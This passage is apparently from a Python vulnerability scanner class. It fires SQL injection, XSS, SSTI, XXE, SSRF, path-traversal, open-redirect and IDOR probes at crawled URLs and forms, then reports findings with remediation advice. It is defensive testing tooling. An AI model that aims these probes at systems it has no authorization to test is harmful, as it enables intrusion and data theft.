                            f"and fields — to unauthenticated attackers, aiding further exploitation."
                        ),
                        severity="medium", url=url, method="POST",
                        parameter=None,
                        payload=GRAPHQL_INTROSPECTION,
                        evidence=f"HTTP {resp.status_code}, __schema present in response ({len(resp.text)} bytes)",
                        remediation=(
                            "Disable introspection in production. "
                            "Use field-level authorization. "
                            "Implement query depth limiting and complexity analysis."
                        ),
                        confidence=0.97, cwe="CWE-200",
                    ))
                    break
            except Exception:
                pass

    # ── XXE Injection ─────────────────────────────────────────────────────────
    async def _check_xxe(self, url: str, client: httpx.AsyncClient):
        """Test XML endpoints for XXE injection."""
        for payload, indicator in XXE_PAYLOADS[:2]:
            try:
                resp = await asyncio.wait_for(
                    client.post(url,
                                content=payload,
                                headers={"Content-Type": "application/xml"}),
                    timeout=10
                )
                if indicator in resp.text and resp.status_code in (200, 500):
                    self._add(DASTFinding(
                        test_id="DAST-XXE", category="A03",
                        title="XML External Entity (XXE) Injection",
                        description=(
                            "The application parses XML with external entity resolution enabled. "
                            "An attacker can read arbitrary files from the server "
                            "(e.g. /etc/passwd, SSH keys, app config) "
                            "or perform SSRF via XML external entities."
                        ),
                        severity="critical", url=url, method="POST",
                        parameter="XML body",
                        payload=payload[:200],
                        evidence=f"File content indicator '{indicator}' found in response",
                        remediation=(
                            "Disable external entity processing in your XML parser. "
                            "Use defusedxml in Python. "
                            "Set FEATURE_EXTERNAL_GENERAL_ENTITIES to false."
                        ),
                        confidence=0.94, cwe="CWE-611",
                        references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                    ))
                    return
            except Exception:
                pass

    # ── IDOR Detection ────────────────────────────────────────────────────────
    async def _check_idor(self, urls: List[str], client: httpx.AsyncClient):
        """
        Detect IDOR by finding numeric/UUID IDs in URLs and testing adjacent IDs.
        A real response for an ID we didn't create indicates IDOR.
        """
        id_pattern = re.compile(r'/(\d+)(?:/|$|\?)')
        uuid_pattern = re.compile(r'/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$|\?)', re.I)

        tested_paths: Set[str] = set()

        for url in urls[:20]:
            if self._timed_out(): break
            parsed = urlparse(url)
            path = parsed.path

            # Test numeric IDs
            for match in id_pattern.finditer(path):
                orig_id = int(match.group(1))
                test_id = orig_id + 1 if orig_id > 1 else orig_id - 1
                test_path = path[:match.start(1)] + str(test_id) + path[match.end(1):]
                test_url = f"{parsed.scheme}://{parsed.netloc}{test_path}"

                if test_url in tested_paths:
                    continue
                tested_paths.add(test_url)

                try:
                    orig_resp = await asyncio.wait_for(client.get(url), timeout=6)
                    test_resp = await asyncio.wait_for(client.get(test_url), timeout=6)

                    # Both return 200 with similar size = potential IDOR
                    if (orig_resp.status_code == 200 and test_resp.status_code == 200
                            and len(test_resp.text) > 100):
                        size_ratio = len(test_resp.text) / max(len(orig_resp.text), 1)
                        if 0.3 < size_ratio < 3.0:  # Similar response size
                            self._add(DASTFinding(
                                test_id="DAST-IDOR", category="A01",
                                title=f"Potential IDOR — Numeric ID in Path: {match.group(1)}",
                                description=(
                                    f"Path '{path}' contains numeric ID '{match.group(1)}'. "
                                    f"Adjacent ID '{test_id}' also returns HTTP 200 with {len(test_resp.text)} bytes. "
                                    f"If no authorization check exists, any user can access other users' data "
                                    f"by simply changing the ID number (IDOR vulnerability)."
                                ),
                                severity="high", url=url, method="GET",
                                parameter="path_id",
                                payload=f"Changed ID from {orig_id} to {test_id}",
                                evidence=(
                                    f"Original ID {orig_id}: HTTP {orig_resp.status_code} ({len(orig_resp.text)} bytes)\n"
                                    f"Adjacent ID {test_id}: HTTP {test_resp.status_code} ({len(test_resp.text)} bytes)"
                                ),
                                remediation=(
                                    "Implement object-level authorization checks on every request. "
                                    "Use UUIDs instead of sequential integers. "
                                    "Verify the requesting user owns the requested resource."
                                ),
                                confidence=0.72, cwe="CWE-639",
                                references=["https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"],
                            ))
                except Exception:
                    pass

    # ── Clickjacking Embed Test ───────────────────────────────────────────────
    async def _check_clickjacking_embed(self, url: str, client: httpx.AsyncClient):
        """Verify if page can actually be embedded in an iframe (beyond just header check)."""
        try:
            resp = await asyncio.wait_for(client.get(url), timeout=8)
            hdrs = {k.lower(): v for k, v in resp.headers.items()}
            xfo  = hdrs.get("x-frame-options", "")
            csp  = hdrs.get("content-security-policy", "")
            has_frame_protection = (
                xfo.upper() in ("DENY", "SAMEORIGIN") or
                "frame-ancestors" in csp.lower()
            )
            if not has_frame_protection and resp.status_code == 200:
                content = resp.text[:500].lower()
                # Check if it looks like a meaningful page (not just a redirect)
                if any(kw in content for kw in ["login", "password", "submit", "form", "input", "button"]):
                    self._add(DASTFinding(
                        test_id="DAST-CLICKJACK", category="A05",
                        title="Clickjacking — Sensitive Page Embeddable in iframe",
                        description=(
                            "The page appears to contain sensitive UI elements (login/forms) "
                            "and can be embedded in an attacker-controlled iframe. "
                            "A clickjacking attack can trick users into submitting forms "
                            "or clicking buttons without their knowledge."
                        ),
                        severity="medium", url=url, method="GET",
                        parameter=None, payload="",
                        evidence=f"No X-Frame-Options or frame-ancestors CSP. Page contains form elements.",
                        remediation="Add 'X-Frame-Options: DENY' or 'Content-Security-Policy: frame-ancestors none'.",
                        confidence=0.82, cwe="CWE-1021",
                    ))
        except Exception:
            pass

    # ── Crawler ───────────────────────────────────────────────────────────────
    async def _crawl(self, start_url: str, client: httpx.AsyncClient) -> Set[str]:
        visited: Set[str] = set()
        queue   = [start_url]
        domain  = urlparse(start_url).netloc

        while queue and len(visited) < 40 and not self._timed_out():
            url = queue.pop(0)
            if url in visited: continue
            visited.add(url)
            try:
                resp = await asyncio.wait_for(client.get(url), timeout=8)
                if "text" not in resp.headers.get("content-type", ""):
                    continue
                soup = BeautifulSoup(resp.text, "html.parser")
                for tag in soup.find_all(["a", "form"]):
                    href = tag.get("href") or tag.get("action", "")
                    if href and not href.startswith(("javascript:", "mailto:", "#")):
                        full = urljoin(url, href).split("#")[0]
                        if urlparse(full).netloc == domain and full not in visited:
                            queue.append(full)
            except Exception:
                pass
        return visited

    # ── URL Parameter Testing ─────────────────────────────────────────────────
    async def _test_url(self, url: str, client: httpx.AsyncClient, domain: str):
        parsed = urlparse(url)
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()} if parsed.query else {}
        if not params:
            return

        for param, orig_val in params.items():
            if self._timed_out(): return

            # SQLi
            await self._test_sqli(url, parsed, params, param, orig_val, client)
            # XSS
            await self._test_xss(url, parsed, params, param, orig_val, client)
            # SSTI
            await self._test_ssti(url, parsed, params, param, orig_val, client)
            # Directory traversal
            await self._test_traversal(url, parsed, params, param, client)
            # SSRF
            if param.lower() in SSRF_PARAM_NAMES:
                await self._test_ssrf(url, parsed, params, param, client)
            # Open redirect
            if any(kw in param.lower() for kw in
                   ("url","redirect","next","return","goto","dest","location","to","link")):
                await self._test_open_redirect(url, parsed, params, param, client)

    # ── SQLi ──────────────────────────────────────────────────────────────────
    async def _test_sqli(self, url, parsed, params, param, orig, client):
        # Error-based
        for probe, sigs in SQLI_ERROR_PROBES[:4]:
            try:
                resp = await self._get(client, self._build(parsed, {**params, param: orig + probe}))
                if not resp: continue
                body = resp.text[:8000]
                for sig in sigs:
                    if sig.lower() in body.lower():
                        self._add(DASTFinding(
                            test_id="DAST-SQLI-ERR", category="A03",
                            title=f"SQL Injection (Error-Based) — Parameter: '{param}'",
                            description=(
                                f"Injecting '{probe}' into '{param}' triggered SQL error: '{sig}'. "
                                f"The database error is reflected in the response — "
                                f"parameter is directly concatenated into a SQL query. "
                                f"Full database extraction is possible."
                            ),
                            severity="critical", url=url, method="GET",
                            parameter=param, payload=probe,
                            evidence=f"SQL error '{sig}' found in response body",
                            remediation="Use parameterized queries. Never concatenate user input into SQL.",
                            confidence=0.97, cwe="CWE-89",
                            references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                        ))
                        return
            except Exception:
                pass

        # Boolean-blind
        try:
            t_resp, f_resp = await asyncio.gather(
                self._get(client, self._build(parsed, {**params, param: orig + SQLI_BOOL_TRUE})),
                self._get(client, self._build(parsed, {**params, param: orig + SQLI_BOOL_FALSE})),
            )
            if t_resp and f_resp:
                diff = self._diff(t_resp.text, f_resp.text)
                if diff > 0.15:
                    self._add(DASTFinding(
                        test_id="DAST-SQLI-BOOL", category="A03",
                        title=f"SQL Injection (Boolean Blind) — Parameter: '{param}'",
                        description=(
                            f"TRUE/FALSE conditions on '{param}' produce {diff:.0%} response difference. "
                            f"Blind SQLi confirmed — attacker can extract full database "
                            f"character-by-character without any error messages."
                        ),
                        severity="high", url=url, method="GET",
                        parameter=param,
                        payload=f"TRUE: {SQLI_BOOL_TRUE} | FALSE: {SQLI_BOOL_FALSE}",
                        evidence=f"Response diff: {diff:.4f} | TRUE={len(t_resp.text)}b | FALSE={len(f_resp.text)}b",
                        remediation="Parameterize all SQL queries.",
                        confidence=0.80, cwe="CWE-89",
                    ))
                    return
        except Exception:
            pass

        # Time-based blind
        for probe, delay, db_hint in SQLI_TIME_PROBES[:3]:
            try:
                t0   = time.time()
                resp = await self._get(
                    client, self._build(parsed, {**params, param: orig + probe}),
                    timeout=delay + 6,
                )
                elapsed = time.time() - t0
                if resp and elapsed >= delay * 0.75:
                    self._add(DASTFinding(
                        test_id="DAST-SQLI-TIME", category="A03",
                        title=f"SQL Injection (Time-Based Blind, {db_hint}) — Parameter: '{param}'",
                        description=(
                            f"Injecting '{probe}' into '{param}' caused {elapsed:.1f}s delay. "
                            f"Confirmed {db_hint} — attacker can extract full database "
                            f"using time-based inference."
                        ),
                        severity="critical", url=url, method="GET",
                        parameter=param, payload=probe,
                        evidence=f"Response time: {elapsed:.2f}s (expected ≥{delay}s) | DB: {db_hint}",
                        remediation="Use parameterized queries. Apply WAF time-delay detection.",
                        confidence=0.86, cwe="CWE-89",
                    ))
                    return
            except Exception:
                pass

    # ── XSS ───────────────────────────────────────────────────────────────────
    async def _test_xss(self, url, parsed, params, param, orig, client):
        for probe, marker in XSS_PROBES[:5]:
            try:
                resp = await self._get(client, self._build(parsed, {**params, param: probe}))
                if not resp: continue
                if marker.lower() in resp.text.lower():
                    idx     = resp.text.lower().find(marker.lower())
                    snippet = resp.text[max(0, idx-20): idx+len(marker)+20]
                    self._add(DASTFinding(
                        test_id="DAST-XSS", category="A03",
                        title=f"Reflected XSS — Parameter: '{param}'",
                        description=(
                            f"XSS probe '{probe[:60]}' reflected unencoded in response for '{param}'. "
                            f"Attacker can inject malicious JavaScript — "
                            f"session theft, keylogging, credential harvesting."
                        ),
                        severity="high", url=url, method="GET",
                        parameter=param, payload=probe,
                        evidence=f"Unencoded reflection: '{snippet}'",
                        remediation=(
                            "HTML-encode all user output. "
                            "Use framework auto-escaping. "
                            "Implement strict Content-Security-Policy."
                        ),
                        confidence=0.94, cwe="CWE-79",
                    ))
                    return
            except Exception:
                pass

    # ── SSTI ──────────────────────────────────────────────────────────────────
    async def _test_ssti(self, url, parsed, params, param, orig, client):
        for probe, expected, engine in SSTI_PROBES:
            try:
                resp = await self._get(client, self._build(parsed, {**params, param: probe}))
                if not resp: continue
                if expected in resp.text and probe not in resp.text:
                    self._add(DASTFinding(
                        test_id="DAST-SSTI", category="A03",
                        title=f"Server-Side Template Injection ({engine}) — Parameter: '{param}'",
                        description=(
                            f"Probe '{probe}' evaluated to '{expected}' server-side. "
                            f"SSTI with {engine} can lead to full Remote Code Execution — "
                            f"complete server compromise."
                        ),
                        severity="critical", url=url, method="GET",
                        parameter=param, payload=probe,
                        evidence=f"Probe '{probe}' → '{expected}' in response",
                        remediation=(
                            "Never render user input through template engines. "
                            "Use sandboxed templates. Whitelist allowed values."
                        ),
                        confidence=0.95, cwe="CWE-94",
                        references=["https://portswigger.net/research/server-side-template-injection"],
                    ))
                    return
            except Exception:
                pass

    # ── SSRF ──────────────────────────────────────────────────────────────────
    async def _test_ssrf(self, url, parsed, params, param, client):
        """Test SSRF by injecting internal/cloud-metadata URLs into URL parameters."""
        for payload in SSRF_PAYLOADS[:4]:
            try:
                resp = await self._get(
                    client, self._build(parsed, {**params, param: payload}), timeout=10
                )
                if not resp: continue
                body = resp.text[:3000]
                # AWS/GCP metadata indicators
                if any(ind in body for ind in ["ami-id","instance-id","iam/security-credentials",
                                                "computeMetadata","169.254","root:","[fonts]"]):
                    self._add(DASTFinding(
                        test_id="DAST-SSRF", category="A10",
                        title=f"Server-Side Request Forgery (SSRF) — Parameter: '{param}'",
                        description=(
                            f"Parameter '{param}' accepts URL '{payload}' and the server fetched it. "
                            f"SSRF allows attackers to scan internal networks, access cloud metadata, "
                            f"steal IAM credentials, and pivot to internal services."
                        ),
                        severity="critical", url=url, method="GET",
                        parameter=param, payload=payload,
                        evidence=f"Internal resource indicators found in response: {body[:300]}",
                        remediation=(
                            "Validate and whitelist allowed URLs/domains. "
                            "Block RFC-1918 ranges and cloud metadata IPs. "
                            "Use an allowlist of permitted external services."
                        ),
                        confidence=0.92, cwe="CWE-918",
                        references=["https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/"],
                    ))
                    return
            except Exception:
                pass

    # ── Open Redirect ─────────────────────────────────────────────────────────
    async def _test_open_redirect(self, url, parsed, params, param, client):
        for payload in REDIRECT_PAYLOADS[:3]:
            try:
                resp = await asyncio.wait_for(
                    client.get(
                        self._build(parsed, {**params, param: payload}),
                        follow_redirects=False,
                    ),
                    timeout=8,
                )
                location = resp.headers.get("location", "")
                if resp.status_code in (301,302,303,307,308) and "evil.example.com" in location:
                    self._add(DASTFinding(
                        test_id="DAST-REDIRECT", category="A01",
                        title=f"Open Redirect — Parameter: '{param}'",
                        description=(
                            f"Parameter '{param}' redirects to arbitrary external URLs. "
                            f"Attackers craft phishing links using your trusted domain. "
                            f"Target: {location}"
                        ),
                        severity="medium", url=url, method="GET",
                        parameter=param, payload=payload,
                        evidence=f"HTTP {resp.status_code} Location: {location}",
                        remediation="Validate redirects against an allowlist. Use relative paths.",
                        confidence=0.92, cwe="CWE-601",
                    ))
                    return
            except Exception:
                pass

    # ── Directory Traversal ───────────────────────────────────────────────────
    async def _test_traversal(self, url, parsed, params, param, client):
        file_params = [p for p in params if any(
            kw in p.lower() for kw in ["file","path","page","doc","name","template","view","load"]
        )]
        if param not in file_params:
            return
        for probe, expected in TRAVERSAL_PROBES[:4]:
            try:
                resp = await self._get(client, self._build(parsed, {**params, param: probe}))
                if resp and expected in resp.text:
                    self._add(DASTFinding(
                        test_id="DAST-TRAVERSAL", category="A01",
                        title=f"Path Traversal — Parameter: '{param}'",
                        description=(
                            f"Probe '{probe}' in '{param}' returned file content. "
                            f"Attacker can read arbitrary server files — SSH keys, configs, source code."
                        ),
                        severity="critical", url=url, method="GET",
                        parameter=param, payload=probe,
                        evidence=f"Response contains '{expected}' — filesystem access confirmed",
                        remediation=(
                            "Validate file paths against an allowlist. "
                            "Use os.path.basename(). Never pass user input to file open calls."
                        ),
                        confidence=0.97, cwe="CWE-22",
                    ))
                    return
            except Exception:
                pass

    # ── POST Form Injection + CSRF ────────────────────────────────────────────
    async def _test_post_forms(self, url: str, client: httpx.AsyncClient):
        try:
            resp = await asyncio.wait_for(client.get(url), timeout=8)
            soup = BeautifulSoup(resp.text, "html.parser")
            forms = soup.find_all("form")

            for form in forms[:5]:
                action = form.get("action", url)
                method = form.get("method", "get").lower()
                form_url = urljoin(url, action)

                # CSRF check on state-changing forms
                if method == "post":
                    input_names = [i.get("name","").lower() for i in form.find_all("input")]
                    has_csrf_token = any(
                        t in " ".join(input_names)
                        for t in ["csrf","token","_token","nonce","csrfmiddlewaretoken"]
                    )
                    if not has_csrf_token:
                        self._add(DASTFinding(
                            test_id="DAST-CSRF", category="A01",
                            title=f"Missing CSRF Token on POST Form — Action: '{action}'",
                            description=(
                                f"POST form at '{form_url}' has no CSRF token. "
                                f"An attacker can trick authenticated users into submitting "
                                f"this form from a malicious site — changing passwords, "
                                f"transferring funds, or performing any action the form allows."
                            ),
                            severity="high", url=form_url, method="POST",
                            parameter=None, payload="",
                            evidence=f"Form fields: {input_names[:8]}. No csrf/token field found.",
                            remediation=(
                                "Add a CSRF token to all state-changing forms. "
                                "Use SameSite=Strict on session cookies. "
                                "Implement the Synchronizer Token Pattern."
                            ),
                            confidence=0.82, cwe="CWE-352",
                            references=["https://owasp.org/www-community/attacks/csrf"],
                        ))

                if method != "post":
                    continue

                fields = {}
                for inp in form.find_all(["input","textarea"]):
                    name  = inp.get("name")
                    value = inp.get("value", "test")
                    if name:
                        fields[name] = value

                if not fields:
                    continue

                # XSS in POST fields
                for field_name in list(fields.keys())[:3]:
                    for probe, marker in XSS_PROBES[:2]:
                        try:
                            resp2 = await asyncio.wait_for(
                                client.post(form_url, data={**fields, field_name: probe}), timeout=8
                            )
                            if marker.lower() in resp2.text.lower():
                                self._add(DASTFinding(
                                    test_id="DAST-XSS-POST", category="A03",
                                    title=f"Reflected XSS via POST — Field: '{field_name}'",
                                    description=(
                                        f"XSS probe reflected from POST field '{field_name}' at '{form_url}'."
                                    ),
                                    severity="high", url=form_url, method="POST",
                                    parameter=field_name, payload=probe,
                                    evidence=f"Marker '{marker}' found in POST response",
                                    remediation="HTML-encode all output. Use CSP.",
                                    confidence=0.91, cwe="CWE-79",
                                ))
                                break
                        except Exception:
                            pass

                # SQLi in POST fields
                for field_name in list(fields.keys())[:3]:
                    for probe, sigs in SQLI_ERROR_PROBES[:2]:
                        try:
                            resp3 = await asyncio.wait_for(
                                client.post(form_url, data={**fields, field_name: fields[field_name]+probe}),
                                timeout=8
                            )
                            body = resp3.text[:5000]
                            for sig in sigs:
                                if sig.lower() in body.lower():
                                    self._add(DASTFinding(
                                        test_id="DAST-SQLI-POST", category="A03",
                                        title=f"SQL Injection via POST — Field: '{field_name}'",
                                        description=f"SQL error '{sig}' triggered via POST field '{field_name}'.",
                                        severity="critical", url=form_url, method="POST",
                                        parameter=field_name, payload=probe,
                                        evidence=f"SQL error '{sig}' in response",
                                        remediation="Use parameterized queries.",
                                        confidence=0.95, cwe="CWE-89",
                                    ))
                                    break
                        except Exception:
                            pass

        except Exception as e:
            logger.debug(f"POST form test error: {e}")

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _build(self, parsed, params: Dict) -> str:
        return urlunparse(parsed._replace(query=urlencode(params)))

    async def _get(self, client, url: str, timeout: float = 8) -> Optional[httpx.Response]:
        try:
            return await asyncio.wait_for(client.get(url), timeout=timeout)
        except Exception:
            return None

    def _diff(self, a: str, b: str) -> float:
        if not a and not b: return 0.0
        if not a or not b:  return 1.0
        return abs(len(a) - len(b)) / max(len(a), len(b))

    def _add(self, finding: DASTFinding):
        key = (finding.test_id, finding.url, finding.parameter)
        existing = {(f.test_id, f.url, f.parameter) for f in self._findings}
        if key not in existing:
            self._findings.append(finding)

    def get_summary(self) -> Dict:
        counts = {"critical":0,"high":0,"medium":0,"low":0,"info":0}
        for f in self._findings:
            counts[f.severity] = counts.get(f.severity, 0) + 1
        return {
            "total":    len(self._findings),
            "counts":   counts,
            "findings": [
                {
                    "test_id":    f.test_id,
                    "category":   f.category,
                    "title":      f.title,
                    "severity":   f.severity,
                    "url":        f.url,
                    "parameter":  f.parameter,
                    "confidence": f.confidence,
                }
                for f in self._findings
            ],
        }


dast_scanner = DASTScanner()
